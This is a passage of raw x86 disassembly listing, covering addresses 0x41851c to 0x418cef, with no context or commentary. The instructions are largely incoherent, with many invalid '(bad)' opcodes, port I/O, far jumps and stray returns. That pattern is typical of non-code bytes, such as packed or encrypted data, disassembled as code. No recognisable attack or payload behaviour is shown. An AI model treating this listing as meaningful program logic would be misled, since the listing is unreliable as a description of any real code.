  41851c:	mov    es,WORD PTR [ebx-0x2b]
  41851f:	mov    esi,0xd09c88e6
  418524:	inc    esp
  418525:	iret   
  418526:	cmp    eax,edi
  418528:	fdiv   st,st(6)
  41852a:	and    DWORD PTR ds:0x52331cf8,eax
  418530:	je     0x418558
  418532:	add    bh,bh
  418534:	jb     0x41850e
  418536:	mov    al,ds:0xb267c55d
  41853b:	dec    edx
  41853c:	inc    esp
  41853d:	jbe    0x4185b6
  41853f:	add    bl,BYTE PTR [esi]
  418541:	nop
  418542:	adc    eax,0x2abe28d1
  418547:	bound  esi,QWORD PTR [esi+ebp*8-0x24]
  41854b:	push   esi
  41854c:	ja     0x418592
  41854e:	(bad)  
  41854f:	in     al,0xc1
  418551:	nop
  418552:	cmp    DWORD PTR [edx-0xfdf6294],0x9f28a223
  41855c:	xchg   esi,eax
  41855d:	xor    DWORD PTR [ebx+esi*1],esp
  418560:	jns    0x41858b
  418562:	mov    ch,0x21
  418564:	and    ah,BYTE PTR cs:[ecx-0xe]
  418568:	in     eax,0x3a
  41856a:	ins    DWORD PTR es:[edi],dx
  41856b:	mov    edx,0xe02159a9
  418570:	dec    ecx
  418571:	jp     0x418513
  418573:	cld    
  418574:	icebp  
  418575:	xor    BYTE PTR [ebp-0x5c819c67],0xe8
  41857c:	cmc    
  41857d:	xlat   BYTE PTR ds:[ebx]
  41857e:	jb     0x41850b
  418580:	ret    0x90aa
  418583:	sbb    eax,0xc483a157
  418588:	mov    dl,0x28
  41858a:	rcl    BYTE PTR [edi],cl
  41858c:	jbe    0x4185d0
  41858e:	add    DWORD PTR [edx+0x4dd15929],edx
  418594:	or     al,0x6c
  418596:	xchg   esi,eax
  418597:	push   ss
  418598:	pop    esi
  418599:	test   DWORD PTR [esp+ecx*1+0x2b],ebp
  41859d:	xor    DWORD PTR [ebx+0x36],eax
  4185a0:	rep lods eax,DWORD PTR ds:[esi]
  4185a2:	and    ebx,ecx
  4185a4:	pop    esp
  4185a5:	hlt    
  4185a6:	(bad)  
  4185a7:	cmp    DWORD PTR [ebx],eax
  4185a9:	das    
  4185aa:	and    esi,0xffffffa8
  4185ad:	mov    ds:0x2df4b4c1,eax
  4185b2:	pop    ecx
  4185b3:	mov    eax,ds:0x1c85ef7c
  4185b8:	retf   
  4185b9:	cmp    BYTE PTR [edi],ah
  4185bb:	int3   
  4185bc:	ins    BYTE PTR es:[edi],dx
  4185bd:	scas   al,BYTE PTR es:[edi]
  4185be:	sbb    eax,0x1848aa7a
  4185c3:	xchg   esi,eax
  4185c4:	jbe    0x418603
  4185c6:	imul   ebx,DWORD PTR [ebx],0x2128862b
  4185cc:	mov    ds:0xc65d143,al
  4185d1:	call   0xdb0063f2
  4185d6:	int3   
  4185d7:	aam    0xef
  4185d9:	neg    DWORD PTR [edx]
  4185db:	inc    ebx
  4185dc:	in     eax,0x0
  4185de:	pop    ebp
  4185df:	or     al,0xda
  4185e1:	aam    0x89
  4185e3:	jg     0x418604
  4185e5:	das    
  4185e6:	jmp    0x4185a2
  4185e8:	fidivr WORD PTR [esp+esi*1]
  4185eb:	xchg   DWORD PTR [esi+edi*2],esp
  4185ee:	lods   eax,DWORD PTR ds:[esi]
  4185ef:	mov    ebx,DWORD PTR ds:0x33e63d48
  4185f5:	cmp    eax,0x1708874e
  4185fa:	xor    eax,0xbb991001
  4185ff:	adc    dl,BYTE PTR [ebx-0x2c]
  418602:	xor    DWORD PTR [esi],ebx
  418604:	mov    edi,esp
  418606:	ja     0x41858a
  418608:	in     al,0xee
  41860a:	jl     0x4185cc
  41860c:	jmp    0x8c9b:0xa44315d
  418613:	ss clc 
  418615:	or     ebx,DWORD PTR [ebp+0x17c967d1]
  41861b:	adc    BYTE PTR [ebp-0x2b],dl
  41861e:	and    BYTE PTR [esi],ah
  418620:	ret    0xde6d
  418623:	mov    WORD PTR [edx],?
  418625:	mov    ah,0xb9
  418627:	cmp    ebp,DWORD PTR [esi]
  418629:	xchg   cl,dh
  41862b:	das    
  41862c:	call   0x5e200de8
  418631:	jge    0x418626
  418633:	jecxz  0x418676
  418635:	sar    dl,0xe
  418638:	icebp  
  418639:	ds aaa 
  41863b:	adc    dh,BYTE PTR [esi+0x416add68]
  418641:	and    DWORD PTR [esi+0x15a10798],0xffffff89
  418648:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41864a:	jb     0x4185d7
  41864c:	push   ebx
  41864d:	push   ds
  41864e:	(bad)  
  41864f:	gs xor al,0xb1
  418652:	aam    0x84
  418654:	outs   dx,DWORD PTR ds:[esi]
  418655:	call   0x7e26:0xfe56111
  41865c:	xor    eax,0xb0362c64
  418661:	xor    al,BYTE PTR [ecx]
  418663:	dec    esi
  418664:	je     0x41865a
  418666:	adc    ecx,edi
  418668:	fwait
  418669:	stc    
  41866a:	sbb    eax,0xe8c431fc
  41866f:	sbb    DWORD PTR [esi+esi*1-0xd],esi
  418673:	scas   al,BYTE PTR es:[edi]
  418674:	mov    bh,0xf6
  418676:	add    eax,0xb957fb3d
  41867b:	or     dh,0xc4
  41867e:	xor    ebx,DWORD PTR [eax+0x186e64b0]
  418684:	pop    ds
  418685:	xor    ah,BYTE PTR [edx-0x27c3d3ea]
  41868b:	call   0x5d5a9bc6
  418690:	aaa    
  418691:	mov    dl,0xc
  418693:	jge    0x4186ca
  418695:	jge    0x41870f
  418697:	xchg   ecx,eax
  418698:	les    edi,FWORD PTR [eax-0x35]
  41869b:	mov    dl,0x46
  41869d:	gs jl  0x4186e9
  4186a0:	cmp    edi,eax
  4186a2:	in     al,dx
  4186a3:	loop   0x418664
  4186a5:	shl    BYTE PTR [edi+0x668b78df],cl
  4186ab:	pop    ss
  4186ac:	test   al,0x24
  4186ae:	xchg   DWORD PTR [edi],eax
  4186b0:	add    edx,0xffffffb8
  4186b3:	sub    BYTE PTR ds:0xdb067ed7,0x14
  4186ba:	sbb    eax,0xbbac65e6
  4186bf:	xlat   BYTE PTR ds:[ebx]
  4186c0:	fs test al,0x52
  4186c3:	jle    0x41871e
  4186c5:	popa   
  4186c6:	push   edi
  4186c7:	out    dx,eax
  4186c8:	(bad)  
  4186ca:	lods   eax,DWORD PTR ds:[esi]
  4186cb:	jle    0x41866f
  4186cd:	cmp    DWORD PTR [eax+0x3d],eax
  4186d0:	out    0x35,eax
  4186d2:	or     DWORD PTR [edx-0x7e95ac41],edx
  4186d8:	ins    DWORD PTR es:[edi],dx
  4186d9:	sbb    edi,DWORD PTR [esi+0x531f8f6b]
  4186df:	stc    
  4186e0:	ret    0xcd2b
  4186e3:	stc    
  4186e4:	ret    0x485b
  4186e7:	pop    eax
  4186e8:	in     al,dx
  4186e9:	nop
  4186ea:	in     eax,0x51
  4186ec:	pop    edx
  4186ed:	pop    DWORD PTR [esi-0x5c]
  4186f0:	xchg   edi,eax
  4186f1:	xchg   ebp,eax
  4186f2:	push   0xab16517
  4186f7:	sub    al,BYTE PTR [edi]
  4186f9:	sbb    DWORD PTR [ecx*1+0x299ad576],eax
  418700:	jg     0x418751
  418702:	in     eax,dx
  418703:	push   esi
  418704:	pop    edx
  418705:	xchg   bl,dl
  418707:	cli    
  418708:	(bad)  
  418709:	mov    ebp,0x1f8ca58a
  41870e:	mov    ss,esp
  418710:	pop    eax
  418711:	fistp  DWORD PTR [esi-0x5f5c0f19]
  418717:	jge    0x4186b2
  418719:	xchg   bh,dl
  41871b:	xor    al,0x64
  41871d:	mov    dl,cl
  41871f:	sbb    bl,0x5f
  418722:	lock push edi
  418724:	rcl    DWORD PTR [ebp-0x3d226e2],1
  41872a:	cmp    DWORD PTR [ecx],ebx
  41872c:	sub    eax,0xa431b8fe
  418731:	es aaa 
  418733:	pop    edx
  418734:	ds in  eax,0x4c
  418737:	pusha  
  418738:	mov    WORD PTR [eax+edx*4+0xd],es
  41873c:	mov    al,dl
  41873e:	cmp    dh,dl
  418740:	add    DWORD PTR [esi+0x3d1f31dd],ebx
  418746:	or     al,0x26
  418748:	sbb    ebp,DWORD PTR [edi]
  41874a:	sub    al,0x62
  41874c:	mov    ecx,0xd0457dc3
  418751:	sub    eax,0x377f175a
  418756:	jp     0x418713
  418758:	pop    esp
  418759:	adc    eax,0x91e2268a
  41875e:	xor    DWORD PTR [edx-0x77],0x506668f
  418765:	adc    edx,DWORD PTR [edx+0xbdeb42b]
  41876b:	and    esi,DWORD PTR [ecx+ebp*1+0x65242080]
  418772:	mov    ds:0x70475247,al
  418777:	mov    al,0x9e
  418779:	pop    eax
  41877a:	inc    esp
  41877b:	dec    BYTE PTR [esi+ecx*1]
  41877e:	push   0x84994660
  418783:	ret    
  418784:	push   0x13
  418786:	in     al,dx
  418787:	or     ch,BYTE PTR [ecx-0x56]
  41878a:	imul   edx,esp,0xf4997670
  418790:	pusha  
  418791:	(bad)  
  418792:	test   esp,0x61b9746
  418798:	and    ecx,esp
  41879a:	push   esp
  41879b:	inc    esi
  41879c:	add    dh,BYTE PTR [edx]
  41879e:	or     eax,0x30ff7281
  4187a3:	or     eax,0x3d0bb41c
  4187a8:	popf   
  4187a9:	fs or  eax,0x93420c28
  4187af:	popa   
  4187b0:	sahf   
  4187b1:	sbb    ah,ah
  4187b3:	mov    dl,0x42
  4187b5:	fsubr  DWORD PTR [edi+0x5b1875d0]
  4187bb:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4187bd:	imul   esp,ebp,0x0
  4187c0:	pop    ebx
  4187c1:	sub    cl,ch
  4187c3:	in     eax,dx
  4187c4:	out    0x88,eax
  4187c6:	(bad)  [esi+ebp*1-0x165e7046]
  4187cd:	(bad)  
  4187ce:	fistp  WORD PTR [esi+0x12de250b]
  4187d4:	ror    BYTE PTR [ecx+0x499b5d3b],1
  4187da:	mov    esi,0x52deb136
  4187df:	sub    esi,esp
  4187e1:	mov    esi,0xbadce9ee
  4187e6:	mov    eax,ds:0x57e7c901
  4187eb:	sub    ecx,0xbc6f4a34
  4187f1:	iret   
  4187f2:	pop    eax
  4187f3:	(bad)  
  4187f4:	iret   
  4187f5:	mov    ebp,0xc5ea404e
  4187fa:	pop    edi
  4187fb:	jmp    0x5480:0x545e3b17
  418802:	not    DWORD PTR [edx-0x29bfbe68]
  418808:	nop
  418809:	enter  0x4c81,0x11
  41880d:	repz inc ebp
  41880f:	arpl   sp,ax
  418811:	out    0x44,eax
  418813:	scas   al,BYTE PTR es:[edi]
  418814:	and    eax,ebp
  418816:	mov    DWORD PTR [ebp+0x62],esi
  418819:	xchg   ecx,eax
  41881a:	sti    
  41881b:	jno    0x41888d
  41881d:	das    
  41881e:	mov    al,0xdf
  418820:	loopne 0x4187db
  418822:	imul   DWORD PTR [ecx+0x40e5ad86]
  418828:	fcomp  st(2)
  41882a:	inc    eax
  41882b:	and    al,0xcc
  41882d:	aam    0x66
  41882f:	xchg   ecx,eax
  418830:	pop    ss
  418831:	fcomp  QWORD PTR [ebp-0x18ca93b5]
  418837:	push   edx
  418838:	ja     0x418839
  41883a:	stos   DWORD PTR es:[edi],eax
  41883b:	adc    DWORD PTR [edx-0x13],edx
  41883e:	dec    esp
  41883f:	xchg   edi,eax
  418840:	ret    
  418841:	jl     0x41882f
  418843:	xchg   esi,eax
  418844:	mov    dl,BYTE PTR [edi-0x75871dc7]
  41884a:	pop    esp
  41884b:	jmp    0x4188c5
  41884d:	pop    ebx
  41884e:	imul   edx,DWORD PTR [edx],0xffffffdd
  418851:	clc    
  418852:	pop    ds
  418853:	cld    
  418854:	neg    DWORD PTR [ebx+0x7a]
  418857:	cmovs  ecx,DWORD PTR [esi-0x9]
  41885b:	sub    DWORD PTR [ebx+0x69c6b54],edx
  418861:	dec    eax
  418862:	dec    ecx
  418863:	lods   eax,DWORD PTR ds:[esi]
  418864:	ja     0x4188ce
  418866:	fucom  st(6)
  418868:	mov    dh,0x1f
  41886a:	or     BYTE PTR [edi-0x15],ah
  41886d:	not    BYTE PTR [esi]
  41886f:	mov    ebx,esp
  418871:	lea    ebp,[eax+0x45]
  418874:	popf   
  418875:	xor    edx,DWORD PTR [esi]
  418877:	pop    ebp
  418878:	js     0x41880e
  41887a:	or     dh,ch
  41887c:	xchg   esi,eax
  41887d:	outs   dx,BYTE PTR ds:[esi]
  41887e:	push   esi
  41887f:	leave  
  418880:	jbe    0x41887b
  418882:	dec    esp
  418883:	xchg   DWORD PTR [esp+eiz*4],ebp
  418886:	xchg   esp,eax
  418887:	add    eax,0x9b71d10e
  41888c:	xchg   edi,eax
  41888d:	sub    al,al
  41888f:	jno    0x418863
  418891:	lea    edi,[esi+0x68]
  418894:	add    DWORD PTR [eax+0x71],0x7bf26c19
  41889b:	rol    BYTE PTR [edi-0x7f],1
  41889e:	jle    0x418904
  4188a0:	repz jno 0x4188ea
  4188a3:	(bad)  
  4188a4:	ja     0x41891b
  4188a6:	dec    ecx
  4188a7:	dec    edi
  4188a8:	es adc al,0x78
  4188ab:	sbb    edx,edx
  4188ad:	mov    ebx,0x3965633a
  4188b2:	xchg   ecx,eax
  4188b3:	xor    eax,DWORD PTR ds:0x788bdc60
  4188b9:	pop    ss
  4188ba:	pop    ss
  4188bb:	sar    ah,1
  4188bd:	cmp    esi,esi
  4188bf:	test   BYTE PTR [ebp-0x41c6d894],bl
  4188c5:	aad    0x4d
  4188c7:	stc    
  4188c8:	cmp    esi,DWORD PTR [edx-0x182789fe]
  4188ce:	pop    eax
  4188cf:	cmp    DWORD PTR [ebp-0x20],ebx
  4188d2:	push   0x57aa0749
  4188d7:	jns    0x4188b5
  4188d9:	mov    DWORD PTR [esi-0x306b85d3],eax
  4188df:	(bad)  
  4188e0:	les    eax,FWORD PTR ds:0xe25b6077
  4188e6:	loope  0x418885
  4188e8:	sub    edx,DWORD PTR [eax]
  4188ea:	std    
  4188eb:	loop   0x41889b
  4188ed:	jg     0x41890b
  4188ef:	call   0xd041:0x85ed4ef0
  4188f6:	cmp    bl,ch
  4188f8:	cmp    ch,BYTE PTR [edi+0xe]
  4188fb:	test   DWORD PTR [edx],edi
  4188fd:	jl     0x4188f0
  4188ff:	mov    esp,0x5e3d6061
  418904:	fldenv [edx]
  418906:	push   eax
  418907:	leave  
  418908:	pop    edi
  418909:	adc    ebp,DWORD PTR [esp+ebx*1+0x380ded60]
  418910:	adc    al,0x22
  418912:	loope  0x418966
  418914:	xor    dl,ah
  418916:	and    al,0xbf
  418918:	ins    BYTE PTR es:[edi],dx
  418919:	inc    esp
  41891a:	pop    esi
  41891b:	pop    ebp
  41891c:	xchg   edx,eax
  41891d:	(bad)  
  41891e:	scas   eax,DWORD PTR es:[edi]
  41891f:	mov    WORD PTR [eax-0x28a1de1d],ds
  418925:	or     ch,BYTE PTR [edx+0x44364011]
  41892b:	pop    ebp
  41892c:	clc    
  41892d:	jl     0x41896d
  41892f:	xor    edi,0x987bd618
  418935:	push   cs
  418936:	push   0xfa0f2676
  41893b:	repnz sbb DWORD PTR [ebp+eiz*4-0x6d],ebp
  418940:	cmc    
  418941:	xchg   esi,eax
  418942:	retf   0x157b
  418945:	and    dh,BYTE PTR [ebp+0x2effd74]
  41894b:	cmp    ecx,edx
  41894d:	pop    ss
  41894e:	loopne 0x41896c
  418950:	jnp    0x418937
  418952:	sub    al,0xf0
  418954:	mov    eax,0x10cf788f
  418959:	shl    DWORD PTR [edx+0x67d83851],0x9c
  418960:	cs mov esp,0x5b37943e
  418966:	jne    0x4188f6
  418968:	jo     0x4189e2
  41896a:	ins    BYTE PTR es:[edi],dx
  41896b:	(bad)  
  41896d:	lods   eax,DWORD PTR ds:[esi]
  41896e:	sbb    DWORD PTR [eax-0x7a],0x2f4f22fb
  418975:	push   esp
  418976:	inc    edx
  418977:	arpl   WORD PTR [ecx-0x7553a8d6],sp
  41897d:	mov    DWORD PTR ds:[ebp-0x46],edi
  418981:	lods   eax,DWORD PTR ds:[esi]
  418982:	xchg   ebp,eax
  418983:	lods   al,BYTE PTR ds:[esi]
  418984:	mov    edi,0x3d740476
  418989:	add    dh,BYTE PTR [edx*8+0x6867ca21]
  418990:	push   es
  418991:	xor    al,0x37
  418993:	jmp    0x418a07
  418995:	xchg   ebx,eax
  418996:	sahf   
  418997:	outs   dx,DWORD PTR ds:[esi]
  418998:	sub    edx,DWORD PTR [ebp-0x78106476]
  41899e:	dec    eax
  41899f:	and    ch,BYTE PTR [ebx+0x23]
  4189a2:	leave  
  4189a3:	mov    ah,0xc4
  4189a5:	fsub   DWORD PTR [esi]
  4189a7:	mov    ch,0x4e
  4189a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189aa:	inc    ebp
  4189ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189ad:	test   DWORD PTR [eax+eiz*8+0x4a],edx
  4189b1:	sub    cl,ch
  4189b3:	inc    esp
  4189b4:	mov    eax,ds:0x5292a01d
  4189b9:	dec    ebx
  4189ba:	xor    DWORD PTR [eax],ebx
  4189bc:	(bad)  
  4189bd:	xchg   esi,eax
  4189be:	pop    ds
  4189bf:	daa    
  4189c0:	dec    esi
  4189c1:	hlt    
  4189c2:	out    dx,eax
  4189c3:	daa    
  4189c4:	dec    esi
  4189c5:	popa   
  4189c6:	(bad)  
  4189c8:	scas   eax,DWORD PTR es:[edi]
  4189c9:	jo     0x418a3f
  4189cb:	pushf  
  4189cc:	fcom   DWORD PTR [esi+eiz*8+0x72ca3709]
  4189d3:	fndisi(8087 only) 
  4189d5:	cmp    bh,BYTE PTR [esi-0x2383cad5]
  4189db:	jmp    0x633f:0x4bd6f979
  4189e2:	pop    eax
  4189e3:	stos   BYTE PTR es:[edi],al
  4189e4:	shl    edi,1
  4189e6:	out    dx,eax
  4189e7:	out    0xba,eax
  4189e9:	fs push es
  4189eb:	repnz mov esp,0x929652f1
  4189f1:	ret    
  4189f2:	mov    al,ds:0x537ab196
  4189f7:	pop    ss
  4189f8:	dec    ebp
  4189f9:	xchg   edi,eax
  4189fa:	jg     0x418a5b
  4189fc:	(bad)  
  4189fd:	lds    edx,FWORD PTR [ecx]
  4189ff:	call   0xbc19820b
  418a04:	fdivr  QWORD PTR [edx-0x14]
  418a07:	ficomp DWORD PTR [eax+0x3d80d910]
  418a0d:	mov    WORD PTR [ebx+0x12091aa9],cs
  418a13:	sub    BYTE PTR [esi+0x6a],dh
  418a16:	inc    ebp
  418a17:	fisub  DWORD PTR [esi+0x5cf4a962]
  418a1d:	call   0x66b0:0xe8ff998e
  418a24:	mov    ebx,0xd8007441
  418a29:	push   esi
  418a2a:	push   edi
  418a2b:	push   es
  418a2c:	je     0x418a73
  418a2e:	cld    
  418a2f:	pop    edx
  418a30:	mov    ch,0x1
  418a32:	xchg   BYTE PTR [edi],bl
  418a34:	pusha  
  418a35:	pop    ecx
  418a36:	ret    
  418a37:	push   edx
  418a38:	sahf   
  418a39:	iret   
  418a3a:	jnp    0x4189f4
  418a3c:	inc    esp
  418a3d:	sbb    BYTE PTR [edx+0x64126075],dl
  418a43:	lds    ecx,FWORD PTR [eax]
  418a45:	ret    
  418a46:	mov    ds:0x31baec31,eax
  418a4b:	sbb    eax,0x35ff6223
  418a50:	xchg   ecx,eax
  418a51:	arpl   WORD PTR [edi],bx
  418a53:	xor    edi,DWORD PTR [ecx-0x57]
  418a56:	cld    
  418a57:	or     al,0x34
  418a59:	ss jg  0x418acd
  418a5c:	aas    
  418a5d:	ds cmp eax,0x675435a0
  418a63:	cmp    al,0xf6
  418a65:	mov    cl,0xd6
  418a67:	push   esp
  418a68:	out    0x55,al
  418a6a:	sbb    eax,0x67ae346b
  418a6f:	sahf   
  418a70:	xor    esi,DWORD PTR [eax]
  418a72:	cli    
  418a73:	jge    0x418a08
  418a75:	push   eax
  418a76:	neg    edx
  418a78:	jnp    0x418a90
  418a7a:	fs mov ch,0x4f
  418a7d:	push   edx
  418a7e:	mov    ebx,0x6d467a20
  418a83:	shl    BYTE PTR ds:0xf360afd6,0x5c
  418a8a:	mov    esi,0x2279ec65
  418a8f:	shr    BYTE PTR ds:0xcc6f7be9,cl
  418a95:	rol    BYTE PTR [ecx-0x5b],cl
  418a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a99:	lea    eax,[ecx]
  418a9b:	xor    DWORD PTR [edx],0x99da108e
  418aa1:	mov    ebx,0xc9ed0d13
  418aa6:	scas   eax,DWORD PTR es:[edi]
  418aa7:	test   BYTE PTR [ebp+0x6a],dl
  418aaa:	mov    dl,0xda
  418aac:	cli    
  418aad:	jl     0x418a7f
  418aaf:	xor    al,0xe3
  418ab1:	psubusw mm0,QWORD PTR [eax]
  418ab4:	mov    edx,0xa4f7c624
  418ab9:	iret   
  418aba:	and    al,BYTE PTR [ebx-0x22]
  418abd:	pushf  
  418abe:	inc    esi
  418abf:	adc    bh,cl
  418ac1:	add    eax,DWORD PTR [edx-0x5c]
  418ac4:	ret    0x164c
  418ac7:	xchg   ebx,eax
  418ac8:	adc    esp,DWORD PTR [eax+0x7c]
  418acb:	sbb    DWORD PTR [eax+eax*4-0x3a],eax
  418acf:	lods   al,BYTE PTR ds:[esi]
  418ad0:	pop    ds
  418ad1:	push   esp
  418ad2:	pop    edi
  418ad3:	mov    al,0xfe
  418ad5:	call   0x9b41:0x3c521353
  418adc:	mov    cl,0x95
  418ade:	pop    esp
  418adf:	jnp    0x418aa4
  418ae1:	mov    ebx,0xe13ed1c0
  418ae6:	ret    0x42f1
  418ae9:	(bad)  
  418aea:	or     BYTE PTR [edi+esi*2],ah
  418aed:	xchg   BYTE PTR [edx-0x2719463e],ch
  418af3:	xchg   ebp,eax
  418af4:	mov    ch,0xd4
  418af6:	mov    bh,0x96
  418af8:	push   edi
  418af9:	push   esp
  418afa:	mov    ch,0x48
  418afc:	mov    dh,0xc0
  418afe:	pop    es
  418aff:	(bad)  
  418b00:	ret    
  418b01:	in     al,dx
  418b02:	push   eax
  418b03:	inc    edi
  418b04:	cmp    bh,BYTE PTR [eax]
  418b06:	cmp    DWORD PTR cs:[eax],ebx
  418b09:	int3   
  418b0a:	mov    eax,ds:0xda80fa24
  418b0f:	jmp    0xcb6c2145
  418b14:	mov    eax,0x7373dab8
  418b19:	not    BYTE PTR [edx+ecx*1-0x37109a25]
  418b20:	nop
  418b21:	pop    es
  418b22:	pop    edx
  418b23:	out    0x5,al
  418b25:	arpl   si,di
  418b27:	stc    
  418b28:	cmp    bl,BYTE PTR [ebx]
  418b2a:	xchg   edi,eax
  418b2b:	test   DWORD PTR [edx],esi
  418b2d:	or     esi,esp
  418b2f:	mov    BYTE PTR ds:0x4155d9fe,bh
  418b35:	pop    edx
  418b36:	aaa    
  418b37:	test   DWORD PTR [edx+edi*4+0x6d],esi
  418b3b:	jmp    0xd585a15e
  418b40:	xchg   edx,eax
  418b41:	sbb    edx,ebp
  418b43:	push   edx
  418b44:	mov    dh,0x9e
  418b46:	in     eax,0x29
  418b48:	or     DWORD PTR [edi-0x20],ecx
  418b4b:	dec    cx
  418b4d:	push   eax
  418b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b4f:	cld    
  418b50:	daa    
  418b51:	cmp    eax,0xa8aa6bbf
  418b56:	int    0x24
  418b58:	lods   eax,DWORD PTR ds:[esi]
  418b59:	loopne 0x418b43
  418b5b:	jns    0x418bcd
  418b5d:	in     al,dx
  418b5e:	xchg   esi,eax
  418b5f:	sbb    BYTE PTR [ebx+0x43],dl
  418b62:	fmul   QWORD PTR [edx]
  418b64:	inc    esi
  418b65:	div    al
  418b67:	pop    edx
  418b68:	inc    edi
  418b69:	jl     0x418b09
  418b6b:	loope  0x418b5b
  418b6d:	mov    edx,0x15446213
  418b72:	dec    edi
  418b73:	jns    0x418b21
  418b75:	or     eax,0x22e3fd87
  418b7a:	dec    edx
  418b7b:	jmp    0xb486:0x679bd7f0
  418b82:	adc    BYTE PTR [eax-0x15],cl
  418b85:	sbb    eax,0x94147a68
  418b8a:	ficomp DWORD PTR [ecx+eax*8]
  418b8d:	dec    edx
  418b8e:	sbb    eax,0x11
  418b91:	add    BYTE PTR [esi],dl
  418b93:	aam    0x43
  418b95:	push   ebp
  418b96:	or     eax,0x66285831
  418b9b:	cmp    al,0xd9
  418b9d:	popa   
  418b9e:	fidiv  DWORD PTR [edi+ebp*2-0x14786a7]
  418ba5:	cdq    
  418ba6:	cmc    
  418ba7:	cmp    al,0xd3
  418ba9:	inc    ecx
  418baa:	stos   BYTE PTR es:[edi],al
  418bab:	ins    DWORD PTR es:[edi],dx
  418bac:	rol    DWORD PTR [ecx+0x5e5e54c],1
  418bb2:	xchg   BYTE PTR [eax-0x532fc382],bl
  418bb8:	dec    ecx
  418bb9:	and    al,0x3a
  418bbb:	rol    DWORD PTR [eax],1
  418bbd:	and    BYTE PTR [eax+0x4],dh
  418bc0:	mul    edx
  418bc2:	sub    bh,BYTE PTR [edi]
  418bc4:	ds (bad) 
  418bc6:	out    dx,al
  418bc7:	out    dx,al
  418bc8:	jmp    0xf9ab:0xed11e77b
  418bcf:	into   
  418bd0:	aad    0x57
  418bd2:	mov    al,0xd2
  418bd4:	lea    eax,[ebx+edi*4+0x22]
  418bd8:	pop    esp
  418bd9:	sub    BYTE PTR [ebp+0x10e82d58],bh
  418bdf:	xor    DWORD PTR [edx],ecx
  418be1:	jo     0x418bee
  418be3:	test   al,ch
  418be5:	ffree  st(2)
  418be7:	xor    cl,cl
  418be9:	in     al,0xf9
  418beb:	xor    BYTE PTR [eax],dh
  418bed:	xchg   edi,eax
  418bee:	sbb    DWORD PTR [esi],0xffffffc7
  418bf1:	cmp    eax,0xdaf6178e
  418bf6:	sti    
  418bf7:	cmp    al,0xf7
  418bf9:	xchg   esi,eax
  418bfa:	imul   esi,DWORD PTR [ecx+ebx*8],0x5f41600c
  418c01:	mov    edx,DWORD PTR [edi]
  418c03:	jns    0x418c83
  418c05:	pop    eax
  418c06:	dec    ebp
  418c07:	or     eax,0x438fa19e
  418c0c:	add    BYTE PTR [edi],bl
  418c0e:	rol    edx,1
  418c10:	sub    eax,0x2e5cafd7
  418c15:	inc    edx
  418c16:	pop    DWORD PTR [ebp+0x2f75a61c]
  418c1c:	es cld 
  418c1e:	in     al,dx
  418c1f:	fiadd  DWORD PTR [edi]
  418c21:	sbb    al,0xce
  418c23:	add    ebp,DWORD PTR [edi-0x7f]
  418c26:	in     al,0x33
  418c28:	(bad)  
  418c29:	in     eax,dx
  418c2a:	mov    eax,ds:0x6ed22248
  418c2f:	or     eax,0x52f3c401
  418c34:	(bad)  
  418c35:	stos   BYTE PTR es:[edi],al
  418c36:	mov    ds:0x9cc630ac,al
  418c3b:	pop    esp
  418c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c3d:	pop    edi
  418c3e:	jge    0x418c4c
  418c40:	pop    esi
  418c41:	xchg   esp,eax
  418c42:	fisub  DWORD PTR [edx]
  418c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c45:	cmc    
  418c46:	ss inc edi
  418c48:	push   eax
  418c49:	pop    ebp
  418c4a:	test   BYTE PTR [eax+0x44],0x3d
  418c4e:	aas    
  418c4f:	ret    
  418c50:	std    
  418c51:	ret    0xa4a3
  418c54:	in     eax,0xf4
  418c56:	xor    al,dl
  418c58:	aas    
  418c59:	test   BYTE PTR [eax-0x5f9bd9af],al
  418c5f:	adc    ch,BYTE PTR [edx+edi*4-0x2ca37bc1]
  418c66:	ror    BYTE PTR [edx+0xb],1
  418c69:	xor    DWORD PTR [ebx+edi*1],edi
  418c6c:	jbe    0x418c44
  418c6e:	dec    edi
  418c6f:	or     bh,bh
  418c71:	imul   ebp,ebx,0x6121f91f
  418c77:	push   ebp
  418c78:	aas    
  418c79:	cmp    BYTE PTR [ebp-0x7d],ch
  418c7c:	iret   
  418c7d:	cdq    
  418c7e:	sti    
  418c7f:	sbb    ch,BYTE PTR ds:0xdfd32792
  418c85:	pop    ebx
  418c86:	sub    BYTE PTR [edi+0x6a],cl
  418c89:	dec    ebp
  418c8a:	test   al,0x3c
  418c8c:	(bad)  
  418c8d:	loop   0x418c3c
  418c8f:	clc    
  418c90:	sbb    al,0xcb
  418c92:	fistp  DWORD PTR [eax]
  418c94:	xor    esi,ebx
  418c96:	xchg   BYTE PTR [edx],ch
  418c98:	in     eax,dx
  418c99:	sbb    eax,0xcbbdafa5
  418c9e:	stos   BYTE PTR es:[edi],al
  418c9f:	mov    bl,ch
  418ca1:	mov    al,ds:0x6e94469c
  418ca6:	scas   eax,DWORD PTR es:[edi]
  418ca7:	inc    ecx
  418ca8:	inc    ebp
  418ca9:	fsub   DWORD PTR [ecx]
  418cab:	fsub   st,st(0)
  418cad:	push   esp
  418cae:	popf   
  418caf:	cwde   
  418cb0:	jmp    0xd7c0aec2
  418cb5:	xor    BYTE PTR [ebx],dl
  418cb7:	pop    edx
  418cb8:	neg    DWORD PTR [ecx+edx*2]
  418cbb:	dec    ecx
  418cbc:	enter  0x9267,0x23
  418cc0:	lahf   
  418cc1:	xor    al,bl
  418cc3:	div    BYTE PTR [eax]
  418cc5:	shr    BYTE PTR [ebx+ebx*4-0x25],1
  418cc9:	test   esi,edi
  418ccb:	adc    BYTE PTR [edi-0x2b],al
  418cce:	xlat   BYTE PTR ds:[ebx]
  418ccf:	pop    ds
  418cd0:	xor    BYTE PTR [edx],dh
  418cd2:	lock repnz imul edi,DWORD PTR [esi],0x5c
  418cd7:	and    bl,BYTE PTR [esi-0x1f6f33fb]
  418cdd:	inc    esi
  418cde:	xlat   BYTE PTR ds:[ebx]
  418cdf:	mov    ecx,0x86bb88ff
  418ce4:	or     edx,0xe814c28b
  418cea:	data16 or dl,dh
  418ced:	or     al,0x24
  418cef:	push   esi
